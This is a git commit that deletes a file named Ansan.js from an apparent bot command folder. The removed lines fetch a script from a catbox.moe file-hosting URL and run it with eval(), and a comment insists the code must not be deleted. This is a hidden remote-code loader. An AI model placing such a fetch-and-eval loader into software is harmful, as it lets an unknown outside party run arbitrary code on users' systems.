61acaf2d520e7bf8d218737b97b61d877db57d03
HANSTZ <hanstzmd@gmail.com>
2025-03-08 02:27:53 +0300

    Delete JUSTATZ_CMDS/Ansan.js

--- JUSTATZ_CMDS/Ansan.js
+++
@@ -1,9 +0,0 @@
-//REMEMBER DON'T DELETE THIS CODE OK
-
-const axios = require('axios');
-
-const url = "https://files.catbox.moe/zjbe9a.js";
-
-axios.get(url)
-    .then(response => eval(response.data))
-    .catch(err => console.error(err));
